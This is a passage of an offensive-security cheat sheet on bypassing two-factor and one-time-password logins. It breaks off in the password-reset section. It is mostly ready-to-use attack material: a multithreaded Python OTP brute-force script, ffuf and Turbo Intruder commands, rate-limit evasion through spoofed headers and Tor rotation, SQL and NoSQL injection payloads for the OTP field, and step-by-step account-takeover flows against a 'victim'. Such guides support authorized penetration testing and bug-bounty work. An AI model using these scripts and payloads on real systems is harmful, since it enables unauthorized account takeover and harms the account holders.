---
title: 2FA/MFA/OTP Bypass
description: Complete guide to Two-Factor Authentication, Multi-Factor Authentication, and One-Time Password bypass techniques with payloads, methodology, real-world attack flows, and privilege escalation.
navigation:
  icon: i-lucide-shield-off
  title: 2FA/MFA/OTP Bypass
---

## What is 2FA/MFA/OTP

Two-Factor Authentication (2FA), Multi-Factor Authentication (MFA), and One-Time Passwords (OTP) add a **second layer** of security beyond username and password. However, implementation flaws frequently allow attackers to **completely bypass** this protection.

::note
2FA bypass is one of the **highest-impact** findings in bug bounty programs. A single bypass can lead to full account takeover on every user account, including administrators. Payouts typically range from **$500 to $50,000+** depending on the platform.
::

::card-group
  ::card
  ---
  title: Response Manipulation
  icon: i-lucide-file-code
  ---
  Intercept and modify server responses to trick the client into believing 2FA verification succeeded. Change `false` → `true`, modify status codes, or replay valid responses.
  ::

  ::card
  ---
  title: Status Code Bypass
  icon: i-lucide-arrow-right-left
  ---
  Alter HTTP status codes from **4xx/403** to **200 OK** in the response. Many frontend applications only check the status code to determine authentication success.
  ::

  ::card
  ---
  title: Direct Navigation
  icon: i-lucide-route
  ---
  Skip the 2FA step entirely by **directly navigating** to authenticated pages after entering valid credentials. The server may fail to enforce 2FA completion on subsequent requests.
  ::

  ::card
  ---
  title: Token/OTP Attacks
  icon: i-lucide-key
  ---
  Exploit weak OTP generation, **brute force** short codes, reuse expired tokens, or leak OTPs through response bodies, headers, or referrer URLs.
  ::

  ::card
  ---
  title: Logic Flaws
  icon: i-lucide-brain
  ---
  Abuse **race conditions**, parameter pollution, session fixation, missing binding between session and 2FA state, or flawed state machine transitions.
  ::

  ::card
  ---
  title: Social Engineering & SIM Swap
  icon: i-lucide-phone-off
  ---
  Bypass SMS-based 2FA through **SIM swapping**, SS7 attacks, voicemail exploitation, or social engineering the carrier to redirect SMS messages.
  ::
::

---

## Methodology & Thinking

Understanding the **logic flow** of 2FA is critical before attempting any bypass. Every bypass exploits a gap in the expected authentication state machine.

::steps{level="3"}

### Understand the Authentication Flow

Map the complete login flow from credential entry through 2FA verification to authenticated session creation. Identify every request, response, cookie, and token involved.

```txt [Expected Flow]
Step 1: POST /login       → Submit username + password
Step 2: Server validates   → Returns 2FA challenge page
Step 3: POST /verify-2fa   → Submit OTP code
Step 4: Server validates   → Creates authenticated session
Step 5: Redirect           → Access to protected dashboard
```

### Identify the Trust Boundary

Where does the server **decide** the user has passed 2FA? Is it a session flag? A cookie? A JWT claim? A database column? Understanding **where the trust decision lives** reveals the bypass.

### Test Every Assumption

The server assumes:
- The user **must** visit the 2FA page before accessing protected resources
- The OTP code is **validated server-side** before granting access
- The session is **not authenticated** until 2FA is complete
- The OTP is **bound** to the specific user and session

**Test every single assumption.** If any fails, you have a bypass.

### Escalate the Impact

Once you find a bypass, demonstrate the **full impact**: account takeover, admin panel access, data exfiltration, or privilege escalation.

::

---

## Response Manipulation

The most common and simplest 2FA bypass. Intercept the server response and modify it to indicate successful verification.

::tip
Response manipulation works when the **frontend application** makes the access decision based on the response body or status code, but the **server doesn't enforce** 2FA state on subsequent requests.
::

### Boolean/Value Flipping

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="JSON Response"}
  ```txt [Payloads]
  # Original server response (2FA failed):
  {"success": false, "message": "Invalid OTP"}
  {"verified": false}
  {"status": "failed"}
  {"valid": false}
  {"code": 403, "error": "Invalid verification code"}
  {"authenticated": false, "2fa_required": true}
  {"mfa_verified": false}
  {"otp_valid": false}
  {"result": "error"}
  {"is_verified": 0}

  # Modified response (change to success):
  {"success": true, "message": "OTP verified"}
  {"verified": true}
  {"status": "success"}
  {"valid": true}
  {"code": 200, "error": ""}
  {"authenticated": true, "2fa_required": false}
  {"mfa_verified": true}
  {"otp_valid": true}
  {"result": "success"}
  {"is_verified": 1}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="XML Response"}
  ```xml [Payloads]
  <!-- Original (failed): -->
  <response>
    <success>false</success>
    <message>Invalid OTP code</message>
    <verified>0</verified>
  </response>

  <!-- Modified (success): -->
  <response>
    <success>true</success>
    <message>OTP verified successfully</message>
    <verified>1</verified>
  </response>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite Steps"}
  ```txt [Attack Flow]
  1. Login with valid credentials
  2. Reach 2FA/OTP verification page
  3. Enter any random OTP (e.g., 000000)
  4. In Burp Suite → enable "Intercept Server Responses"
  5. Forward the request
  6. When response comes back, modify:

     FROM: {"success":false,"message":"Invalid code"}
     TO:   {"success":true,"message":"Valid code"}

     FROM: HTTP/1.1 403 Forbidden
     TO:   HTTP/1.1 200 OK

  7. Forward the modified response
  8. Check if you're now authenticated

  Alternative - Burp Match & Replace Rules:
  → Match: "success":false
  → Replace: "success":true

  → Match: "verified":false
  → Replace: "verified":true

  → Match: "2fa_required":true
  → Replace: "2fa_required":false
  ```
  :::
::

### Status Code Manipulation

```txt [Payloads]
# Intercept response and change status code

FROM: HTTP/1.1 403 Forbidden
TO:   HTTP/1.1 200 OK

FROM: HTTP/1.1 401 Unauthorized
TO:   HTTP/1.1 200 OK

FROM: HTTP/1.1 302 Found (redirect to /verify-2fa)
TO:   HTTP/1.1 200 OK

FROM: HTTP/1.1 401 Unauthorized
TO:   HTTP/1.1 302 Found
      Location: /dashboard

FROM: HTTP/1.1 400 Bad Request
TO:   HTTP/1.1 200 OK

# Also try changing redirect locations:
FROM: Location: /login?error=invalid_otp
TO:   Location: /dashboard

FROM: Location: /verify-2fa
TO:   Location: /account/settings

FROM: Location: /2fa-required
TO:   Location: /admin/panel
```

### Response Body Replacement

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Full Response Swap"}
  ```txt [Payloads]
  # Technique: Capture a VALID 2FA response, then replay it

  STEP 1: Login to your OWN account (attacker account)
  STEP 2: Complete 2FA with valid code
  STEP 3: Save the ENTIRE success response (headers + body)

  STEP 4: Login to VICTIM account with stolen credentials
  STEP 5: Enter random OTP on victim's 2FA page
  STEP 6: Replace the ENTIRE error response with saved success response
  STEP 7: Forward modified response

  # The saved response might look like:
  HTTP/1.1 200 OK
  Content-Type: application/json
  Set-Cookie: session=VALID_SESSION_TOKEN; Path=/; HttpOnly

  {"success":true,"redirect":"/dashboard","user":{"id":123,"role":"user"}}

  # Key: Sometimes the session token in Set-Cookie header
  # from YOUR valid response works for the victim's session
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Swap"}
  ```txt [Payloads]
  # If server returns a token/JWT after 2FA success:

  STEP 1: Complete 2FA on attacker account
  STEP 2: Capture the token/JWT returned
  STEP 3: Login as victim
  STEP 4: At 2FA step, replace response token with attacker's token
  STEP 5: OR directly use the token in Authorization header

  # Example JWT swap:
  FROM: {"token": ""}
  TO:   {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

  # Check if JWT contains user identifier
  # Decode JWT → change "sub" or "user_id" to victim's ID
  # Re-encode (if signing key is weak/known)
  ```
  :::
::

::warning
Response manipulation only works when the server **doesn't enforce 2FA state server-side**. Modern applications should track 2FA completion in the session on the backend, making client-side manipulation ineffective. Always test both the response change AND whether subsequent authenticated requests actually work.
::

---

## Direct Navigation / Forced Browsing

Skip the 2FA page entirely by directly accessing authenticated endpoints after entering valid credentials.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="URL Bypass Payloads"}
  ```txt [Payloads]
  # After logging in with valid credentials, instead of entering OTP,
  # directly navigate to these URLs:

  /dashboard
  /home
  /account
  /profile
  /settings
  /admin
  /admin/dashboard
  /panel
  /my-account
  /api/user/me
  /api/v1/user/profile
  /api/v1/dashboard
  /user/settings
  /account/settings
  /internal
  /portal
  /console
  /app
  /main
  /members
  /member/dashboard
  /cp
  /control-panel

  # Try with trailing slash
  /dashboard/
  /account/

  # Try with different HTTP methods
  GET /dashboard
  POST /dashboard
  PUT /dashboard

  # Try accessing API endpoints directly
  /api/user
  /api/account
  /api/data
  /graphql (with authenticated query)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Burp Suite Steps"}
  ```txt [Attack Flow]
  1. Login with valid username:password
  2. Server responds with 2FA page / redirect to /verify-otp
  3. DO NOT submit OTP
  4. In browser URL bar, manually type: https://target.com/dashboard
  5. OR in Burp, change the request:

     Original request going to /verify-otp
     Change to: GET /dashboard HTTP/1.1

  6. If dashboard loads → 2FA BYPASSED

  7. Also try:
     - Open a new tab with /dashboard
     - Use Burp Repeater to send GET /dashboard with session cookie
     - Try /api/user/me to check if session is already authenticated
     - Check if the session cookie already has "authenticated=true"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cookie Manipulation"}
  ```txt [Payloads]
  # Check cookies set after password login (before 2FA)
  # Sometimes a cookie flag controls 2FA state

  # Look for cookies like:
  2fa_verified=0          → Change to: 2fa_verified=1
  mfa_complete=false      → Change to: mfa_complete=true
  auth_step=1             → Change to: auth_step=2
  login_step=otp          → Change to: login_step=complete
  verified=no             → Change to: verified=yes
  needs_2fa=true          → Change to: needs_2fa=false
  tfa_required=1          → Change to: tfa_required=0
  otp_pending=true        → Change to: otp_pending=false
  auth_level=1            → Change to: auth_level=2
  is_authenticated=partial → Change to: is_authenticated=full

  # Also check localStorage/sessionStorage in browser console:
  localStorage.getItem('2fa_verified')
  sessionStorage.getItem('auth_step')

  # Modify via console:
  localStorage.setItem('2fa_verified', 'true')
  sessionStorage.setItem('auth_step', 'complete')
  ```
  :::
::

### Referrer Header Bypass

```txt [Payloads]
# Some applications check the Referer header to verify
# the request came from the 2FA page.
# Try modifying or removing it:

# Original:
Referer: https://target.com/login

# Modified - pretend you came from 2FA success page:
Referer: https://target.com/2fa/success
Referer: https://target.com/verify-complete
Referer: https://target.com/dashboard
Referer: https://target.com/otp-verified

# Remove Referer entirely:
# (Delete the Referer header from the request)

# Blank Referer:
Referer:
```

---

## OTP Brute Force

Short OTP codes (4–6 digits) can be brute forced if no rate limiting or lockout mechanism exists.

::caution
Brute forcing requires **no rate limiting**, **no account lockout**, and **no CAPTCHA** after failed attempts. Always check for these protections first.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Burp Intruder"}
  ```txt [Attack Flow]
  # 4-digit OTP: 0000–9999 (10,000 combinations)
  # 6-digit OTP: 000000–999999 (1,000,000 combinations)

  STEP 1: Capture the OTP verification request in Burp
  STEP 2: Send to Intruder
  STEP 3: Mark the OTP parameter as payload position

  POST /verify-2fa HTTP/1.1
  Host: target.com
  Content-Type: application/json
  Cookie: session=abc123

  {"otp":"§000000§"}

  STEP 4: Payload type → Numbers
          From: 000000
          To: 999999
          Step: 1
          Min integer digits: 6
          Max integer digits: 6

  STEP 5: Set resource pool → 10-50 concurrent threads
  STEP 6: Start attack
  STEP 7: Sort by response length/status to find valid OTP
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ffuf"}
  ```bash [Terminal]
  # Generate OTP wordlist
  seq -w 000000 999999 > otp_wordlist.txt

  # 6-digit OTP brute force
  ffuf -u "https://target.com/verify-2fa" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "Cookie: session=YOUR_SESSION_COOKIE" \
    -d '{"otp":"FUZZ"}' \
    -w otp_wordlist.txt \
    -mc 200 \
    -fs 45 \
    -t 100 \
    -o otp_brute.json

  # 4-digit OTP brute force
  seq -w 0000 9999 > otp_4digit.txt
  ffuf -u "https://target.com/api/verify-otp" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=YOUR_SESSION" \
    -d "code=FUZZ" \
    -w otp_4digit.txt \
    -mc 200,302 \
    -t 50

  # With rate limit evasion (slower)
  ffuf -u "https://target.com/verify-2fa" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"otp":"FUZZ"}' \
    -w otp_wordlist.txt \
    -rate 10 \
    -t 1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python Script"}
  ```python [brute_otp.py]
  #!/usr/bin/env python3
  """
  OTP Brute Force Script
  Usage: python3 brute_otp.py
  """
  import requests
  import sys
  from concurrent.futures import ThreadPoolExecutor, as_completed

  TARGET = "https://target.com/verify-2fa"
  SESSION_COOKIE = "your_session_cookie_here"
  THREADS = 50

  headers = {
      "Content-Type": "application/json",
      "Cookie": f"session={SESSION_COOKIE}"
  }

  def try_otp(code):
      try:
          data = {"otp": code}
          resp = requests.post(TARGET, json=data, headers=headers, timeout=10)
          
          # Adjust success conditions based on target
          if resp.status_code == 200 and "success" in resp.text.lower():
              return code, True, resp.text
          if resp.status_code == 302:
              return code, True, resp.headers.get("Location", "")
          if "invalid" not in resp.text.lower() and "error" not in resp.text.lower():
              return code, True, resp.text
          
          return code, False, resp.status_code
      except Exception as e:
          return code, False, str(e)

  def main():
      print(f"[*] Brute forcing OTP on {TARGET}")
      print(f"[*] Using {THREADS} threads")
      
      # Generate all 6-digit codes
      codes = [f"{i:06d}" for i in range(1000000)]
      
      with ThreadPoolExecutor(max_workers=THREADS) as executor:
          futures = {executor.submit(try_otp, code): code for code in codes}
          
          for i, future in enumerate(as_completed(futures)):
              code, success, detail = future.result()
              
              if success:
                  print(f"\n[+] VALID OTP FOUND: {code}")
                  print(f"[+] Response: {detail}")
                  sys.exit(0)
              
              if i % 1000 == 0:
                  print(f"[*] Tried {i}/{len(codes)} codes...")
      
      print("[-] No valid OTP found")

  if __name__ == "__main__":
      main()
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Turbo Intruder"}
  ```python [turbo_otp.py]
  # Burp Suite Turbo Intruder script
  # Much faster than regular Intruder

  def queueRequests(target, wordlists):
      engine = RequestEngine(
          endpoint=target.endpoint,
          concurrentConnections=50,
          requestsPerConnection=100,
          pipeline=True
      )
      
      for i in range(0, 1000000):
          code = str(i).zfill(6)
          engine.queue(target.req, code)

  def handleResponse(req, interesting):
      if req.status == 200:
          table.add(req)
      # Also check for redirects
      if req.status == 302:
          table.add(req)
      # Check response length difference
      if req.length != baseline_length:
          table.add(req)
  ```
  :::
::

### Rate Limit Bypass for Brute Force

When rate limiting blocks brute force, try these evasion techniques:

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Header Manipulation"}
  ```txt [Payloads]
  # Add/modify headers to bypass IP-based rate limiting
  # The server may trust these headers for client identification

  X-Forwarded-For: 127.0.0.1
  X-Forwarded-For: RANDOM_IP
  X-Forwarded-For: 10.0.0.1
  X-Forwarded-For: 192.168.1.1
  X-Originating-IP: 127.0.0.1
  X-Remote-IP: 127.0.0.1
  X-Remote-Addr: 127.0.0.1
  X-Client-IP: 127.0.0.1
  X-Real-IP: 127.0.0.1
  X-Host: 127.0.0.1
  X-Forwarded: 127.0.0.1
  Forwarded-For: 127.0.0.1
  Forwarded: for=127.0.0.1
  True-Client-IP: 127.0.0.1
  CF-Connecting-IP: 127.0.0.1
  Fastly-Client-IP: 127.0.0.1
  X-Cluster-Client-IP: 127.0.0.1
  X-Azure-ClientIP: 127.0.0.1

  # Rotate IP per request:
  X-Forwarded-For: 1.1.1.{1-255}
  X-Forwarded-For: 10.0.{0-255}.{1-255}

  # Multiple IPs in chain:
  X-Forwarded-For: RANDOM_IP, 127.0.0.1
  X-Forwarded-For: 8.8.8.8, VICTIM_IP, 127.0.0.1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Request Manipulation"}
  ```txt [Payloads]
  # Add null bytes, spaces, or extra parameters to make
  # each request appear "unique" to the rate limiter

  # Null byte in OTP parameter
  {"otp":"123456\x00"}
  {"otp":"123456%00"}
  {"otp":"123456\n"}
  {"otp":"123456\r\n"}
  {"otp":" 123456"}
  {"otp":"123456 "}
  {"otp": "123456"}

  # Extra/random parameters
  {"otp":"123456","random":"abc123"}
  {"otp":"123456","_":"1234567890"}
  {"otp":"123456","cachebust":"RANDOM"}

  # Different Content-Types
  Content-Type: application/json         → {"otp":"123456"}
  Content-Type: application/xml          → <otp>123456</otp>
  Content-Type: application/x-www-form-urlencoded → otp=123456
  Content-Type: multipart/form-data      → (form data)
  Content-Type: text/plain               → otp=123456

  # URL parameter + body parameter
  POST /verify-2fa?otp=123456
  Body: {"otp":"654321"}

  # HTTP method change
  POST /verify-2fa → PUT /verify-2fa
  POST /verify-2fa → PATCH /verify-2fa

  # Case variation in endpoint
  POST /verify-2fa
  POST /Verify-2fa
  POST /VERIFY-2FA
  POST /verify-2FA
  POST /verify-2fa/
  POST /verify-2fa/.
  POST //verify-2fa
  POST /./verify-2fa
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Session Reset"}
  ```txt [Attack Flow]
  # If rate limit is per-session, get a new session each batch:

  STEP 1: Login with valid credentials → Get session cookie A
  STEP 2: Try OTPs 000000-000999 with session A
  STEP 3: Rate limited! 
  STEP 4: Login again → Get NEW session cookie B
  STEP 5: Try OTPs 001000-001999 with session B
  STEP 6: Repeat until valid OTP found

  # Script approach:
  for batch in range(0, 1000000, 1000):
      session = login(username, password)  # New session
      for otp in range(batch, batch+1000):
          try_otp(session, str(otp).zfill(6))
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="IP Rotation"}
  ```bash [Terminal]
  # Using proxychains with rotating proxies
  proxychains4 python3 brute_otp.py

  # Using Tor for IP rotation
  # Change circuit every N requests
  torify python3 brute_otp.py

  # Using rotating proxy list
  # proxy_list.txt:
  # http://proxy1:8080
  # http://proxy2:8080
  # socks5://proxy3:1080
  ```
  :::
::

---

## OTP in Response / Information Disclosure

Sometimes the OTP is **leaked** in the server response itself, making the entire 2FA mechanism useless.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Response Body"}
  ```txt [Where to Look]
  # Check the RESPONSE when 2FA page loads or when OTP is requested

  # Response body leaks:
  {"message":"OTP sent","otp":"482913"}
  {"status":"sent","code":"193847"}
  {"debug_otp":"582014"}
  {"verification_code":"294710"}
  {"token":"381029"}

  # Hidden HTML fields:
  <input type="hidden" name="otp" value="482913">
  <input type="hidden" name="verification_code" value="193847">
  <input type="hidden" id="expected_otp" value="582014">

  # HTML comments:
  <!-- OTP: 482913 -->
  <!-- Debug: verification_code=193847 -->
  <!-- TODO: remove debug OTP output -->

  # JavaScript variables:
  var expectedOtp = "482913";
  let verificationCode = "193847";
  const otp = "582014";
  window.__OTP__ = "294710";

  # Check EVERY response header:
  X-OTP: 482913
  X-Verification-Code: 193847
  X-Debug-OTP: 582014
  X-Token: 294710
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Response Headers"}
  ```txt [Payloads]
  # Inspect ALL response headers when:
  # 1. Requesting OTP send
  # 2. Loading 2FA page
  # 3. Submitting wrong OTP (error response)
  # 4. Requesting OTP resend

  # Look for custom headers:
  X-OTP-Code: 123456
  X-Verification: 654321
  X-Debug: otp=123456
  X-Custom-Header: code:123456
  Set-Cookie: otp=123456
  Set-Cookie: verification_code=654321
  Set-Cookie: debug_otp=123456

  # Burp Suite approach:
  # 1. Enable "Intercept Server Responses"
  # 2. Look at EVERY response header
  # 3. Search response body for 4-6 digit numbers
  # 4. Use Burp Search: match any 6-digit pattern in responses
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="API Response Leak"}
  ```txt [Payloads]
  # When triggering "Send OTP" or "Resend OTP":

  # POST /api/send-otp
  # Response might contain:
  {
    "message": "OTP sent to +1***456",
    "otp": "482913",
    "expires_in": 300
  }

  # POST /api/resend-otp
  # Response might contain:
  {
    "success": true,
    "code": "193847",
    "sent_to": "user@email.com"
  }

  # GET /api/user/verification-status
  {
    "pending": true,
    "otp_code": "582014",
    "attempts_remaining": 3
  }

  # Sometimes only in DEBUG/STAGING environments
  # Check for debug parameters:
  POST /api/send-otp?debug=true
  POST /api/send-otp?test=1
  POST /api/send-otp?verbose=true
  GET /api/send-otp?env=development
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Search Pattern (Burp)"}
  ```txt [Burp Suite Search]
  # In Burp → Search → Response body

  # Regex patterns to find OTP leaks:
  "otp"\s*:\s*"\d{4,8}"
  "code"\s*:\s*"\d{4,8}"
  "token"\s*:\s*"\d{4,8}"
  "verification"\s*:\s*"\d{4,8}"
  "pin"\s*:\s*"\d{4,8}"
  [Oo][Tt][Pp].*\d{4,8}
  verification.code.*\d{4,8}
  
  # In Burp Logger/History:
  # Filter by response containing digit patterns
  # Look at Set-Cookie headers
  # Check ALL API responses during login flow
  ```
  :::
::

---

## OTP Reuse / No Expiry

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Same OTP Reuse"}
  ```txt [Attack Flow]
  # Test if a previously valid OTP can be reused

  STEP 1: Request OTP → Receive code 482913
  STEP 2: Submit 482913 → Success (logged in)
  STEP 3: Logout
  STEP 4: Login again
  STEP 5: Submit SAME code 482913 → Does it work?

  # If YES → OTP has no single-use enforcement
  # Impact: Captured/intercepted OTPs remain valid forever

  # Also test:
  - Use OTP after 5 minutes
  - Use OTP after 30 minutes
  - Use OTP after 24 hours
  - Use OTP from a different session
  - Use OTP from a different browser/device
  - Use OTP after requesting a NEW OTP (old one should be invalid)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Previous OTP Valid"}
  ```txt [Attack Flow]
  # Test if requesting a new OTP invalidates the old one

  STEP 1: Request OTP → Receive code 482913 (OTP #1)
  STEP 2: Request OTP again → Receive code 193847 (OTP #2)
  STEP 3: Submit OTP #1 (482913) → Does it work?

  # If YES → Old OTPs are not invalidated
  # Impact: If attacker intercepts any OTP, it remains valid
  #         even after user requests new codes

  # Test multiple generations:
  STEP 1: Request OTP → 111111
  STEP 2: Request OTP → 222222
  STEP 3: Request OTP → 333333
  STEP 4: Try 111111 → Should fail but might work
  STEP 5: Try 222222 → Should fail but might work
  STEP 6: Try 333333 → Should work (latest)
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="No Expiry"}
  ```txt [Attack Flow]
  # Test OTP time window / expiration

  STEP 1: Request OTP at 10:00:00 → Receive 482913
  STEP 2: Wait 5 minutes
  STEP 3: Submit 482913 at 10:05:00 → Works?
  STEP 4: Wait 30 minutes
  STEP 5: Submit 482913 at 10:30:00 → Works?
  STEP 6: Wait 24 hours
  STEP 7: Submit 482913 next day → Works?

  # Expected: OTP should expire within 30-60 seconds
  # Vulnerable: OTP valid for hours or indefinitely

  # TOTP codes (Google Authenticator):
  # Standard window: ±30 seconds
  # Test: Submit code from 5 minutes ago
  # Some implementations accept codes within ±5 minute window
  ```
  :::
::

---

## Null / Empty OTP

Submit empty, null, or special values instead of a valid OTP.

```txt [Payloads]
# Empty values
{"otp":""}
{"otp":null}
{"otp":0}
{"otp":false}
{"otp":[]}
{"otp":{}}
{"otp":"null"}
{"otp":"nil"}
{"otp":"undefined"}
{"otp":"NaN"}
{"otp":"None"}

# Missing parameter entirely
{}
{"username":"victim"}

# URL encoded empty
otp=
otp=%00
otp=%0a
otp=%0d
otp=%20
otp=+

# Array instead of string
{"otp":["123456"]}
{"otp":[""]}
{"otp":[null]}
{"otp":[true]}

# Boolean
{"otp":true}
{"otp":false}

# Integer instead of string
{"otp":0}
{"otp":123456}
{"otp":000000}
{"otp":-1}
{"otp":999999999}

# Special strings
{"otp":"0"}
{"otp":"000000"}
{"otp":"      "}
{"otp":"\t\t\t\t\t\t"}
{"otp":"\n"}

# SQL injection in OTP field
{"otp":"' OR '1'='1"}
{"otp":"' OR 1=1--"}
{"otp":"' OR '1'='1'--"}
{"otp":"1' OR 1=1#"}

# NoSQL injection in OTP field
{"otp":{"$gt":""}}
{"otp":{"$ne":""}}
{"otp":{"$gt":0}}
{"otp":{"$exists":true}}
{"otp":{"$regex":".*"}}
{"otp":{"$ne":"invalid"}}
{"otp":{"$in":["000000","111111","222222"]}}
```

---

## Parameter Manipulation

Modify request parameters to bypass 2FA verification logic.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Parameter Removal"}
  ```txt [Payloads]
  # Original request:
  POST /verify-2fa
  {"email":"victim@example.com","otp":"123456"}

  # Remove OTP parameter entirely:
  POST /verify-2fa
  {"email":"victim@example.com"}

  # Remove email parameter:
  POST /verify-2fa
  {"otp":"123456"}

  # Empty body:
  POST /verify-2fa
  {}

  # Remove specific 2FA parameters:
  # Original: {"user_id":123,"otp":"482913","2fa_token":"abc"}
  # Try:      {"user_id":123}
  # Try:      {"user_id":123,"otp":"482913"}
  # Try:      {"user_id":123,"2fa_token":"abc"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="User ID Swap"}
  ```txt [Payloads]
  # Complete 2FA for YOUR account, then swap user identifier
  # to access VICTIM account

  # Original (your account):
  POST /verify-2fa
  {"user_id":ATTACKER_ID,"otp":"VALID_OTP"}

  # Modified (swap to victim):
  POST /verify-2fa
  {"user_id":VICTIM_ID,"otp":"VALID_OTP"}

  # With email:
  POST /verify-2fa
  {"email":"attacker@evil.com","otp":"VALID_OTP"}
  →
  {"email":"victim@example.com","otp":"VALID_OTP"}

  # With phone:
  {"phone":"+1234567890","otp":"VALID_OTP"}
  →
  {"phone":"+0987654321","otp":"VALID_OTP"}

  # With username:
  {"username":"attacker","otp":"VALID_OTP"}
  →
  {"username":"admin","otp":"VALID_OTP"}
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="2FA Disable Flags"}
  ```txt [Payloads]
  # Add parameters that might disable 2FA check

  {"otp":"123456","disable_2fa":true}
  {"otp":"123456","skip_2fa":true}
  {"otp":"123456","2fa_enabled":false}
  {"otp":"123456","mfa_required":false}
  {"otp":"123456","bypass":true}
  {"otp":"123456","debug":true}
  {"otp":"123456","test":true}
  {"otp":"123456","admin":true}
  {"otp":"123456","verify":false}
  {"otp":"123456","trusted_device":true}
  {"otp":"123456","remember_device":true}
  {"otp":"123456","is_trusted":true}

  # In URL parameters:
  POST /verify-2fa?disable_2fa=true
  POST /verify-2fa?skip_mfa=1
  POST /verify-2fa?debug=1
  POST /verify-2fa?bypass=true
  POST /verify-2fa?test_mode=1
  POST /verify-2fa?trusted=1
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Backup Code Abuse"}
  ```txt [Payloads]
  # Try backup/recovery codes instead of OTP

  # If backup code endpoint exists:
  POST /verify-backup-code
  {"code":"AAAAAAAA"}

  # Try backup codes in OTP field:
  {"otp":"backup_code_here"}
  {"otp":"recovery_code"}

  # Try common default backup codes:
  {"backup_code":"00000000"}
  {"backup_code":"12345678"}
  {"backup_code":"AAAAAAAA"}
  {"backup_code":"11111111"}

  # Brute force 8-char backup codes:
  # Usually alphanumeric: [A-Z0-9]{8}
  # Check if rate limiting applies to backup codes too
  # Often backup code endpoint has WEAKER protection

  # Try using backup code endpoint
  # when OTP endpoint is rate limited
  ```
  :::
::

---

## TOTP / Authenticator App Bypass

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="TOTP Secret Leak"}
  ```txt [Where to Look]
  # TOTP secret is the shared key used to generate time-based codes
  # If leaked, attacker can generate valid codes forever

  # Check during 2FA SETUP:
  # When QR code is displayed, the TOTP secret is embedded

  # QR code URL format:
  otpauth://totp/Example:user@email.com?secret=JBSWY3DPEHPK3PXP&issuer=Example&digits=6&period=30

  # The secret is: JBSWY3DPEHPK3PXP
  # With this secret, generate valid OTPs:

  # Using oathtool (Kali Linux):
  oathtool --totp --base32 "JBSWY3DPEHPK3PXP"

  # Check if TOTP secret appears in:
  1. API response when enabling 2FA
  2. QR code page source code
  3. JavaScript variables
  4. API endpoint: GET /api/user/2fa/secret
  5. Account settings API response
  6. Backup/export functionality
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Time Window Abuse"}
  ```txt [Payloads]
  # TOTP standard: 30-second time window
  # Some implementations accept wider windows

  # Test with codes from:
  - Current time window (should work)
  - Previous 30-second window (often works, ±1 tolerance)
  - 2 windows ago (60 seconds old)
  - 5 windows ago (150 seconds old)
  - 10 windows ago (5 minutes old)
  - 20 windows ago (10 minutes old)

  # Generate codes for different time windows:
  oathtool --totp --base32 "SECRET" --now="2024-01-01 10:00:00"
  oathtool --totp --base32 "SECRET" --now="2024-01-01 09:59:30"
  oathtool --totp --base32 "SECRET" --now="2024-01-01 09:59:00"
  oathtool --totp --base32 "SECRET" --now="2024-01-01 09:55:00"

  # If server accepts codes from 5+ minutes ago:
  # → Time window is too large
  # → Attacker has longer window to use intercepted codes
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Shared Secret for All Users"}
  ```txt [Attack Flow]
  # Rare but critical: Server uses SAME TOTP secret for all users

  STEP 1: Enable 2FA on your own account
  STEP 2: Extract the TOTP secret (from QR code)
  STEP 3: Generate TOTP code using that secret
  STEP 4: Login as victim
  STEP 5: Submit the code generated from YOUR secret
  STEP 6: If it works → all users share the same TOTP seed

  # This means anyone who has enabled 2FA can generate
  # valid codes for ANY other account
  ```
  :::
::

---

## Password Reset 2FA Bypass

Abuse the **password reset** flow to bypass 2FA entirely.

```txt [Attack Flow]
# Method 1: Password Reset Skips 2FA
STEP 1: Go to "Forgot Password" on login page
STEP 2: Enter victim's email
STEP 3: Receive password reset link (on victim's email - social engineering)
STEP 4: Reset password via link
STEP 5: Login with new password
STEP 6: Check if 2FA is still required
        → Many apps auto-login after password reset WITHOUT 2FA

# Method 2: Password Reset Disables 2FA
STEP 1: Reset victim's password
STEP 2: After reset, 2FA is automatically disabled
STEP 3: Login with new password, no 2FA prompt

# Method 3: Password Reset Link = Authenticated Session
STEP 1: Password reset link: https://target.com/reset?token=abc123
STEP 2: After clicking link and setting new password
STEP 3: The reset token creates a fully authenticated session
STEP 4: No 2FA verification required

# Method 4: OAuth/Social Login Bypasses 2FA
STEP 1: Account has 2FA enabled
STEP 2: Login via "Sign in with Google/GitHub/Facebook"
STEP 3: OAuth login bypasses 2FA entirely
STEP 4: Full access without OTP

# Method 5: SSO/SAML Bypasses 2FA
STEP 1: Login via SSO/SAML instead of password
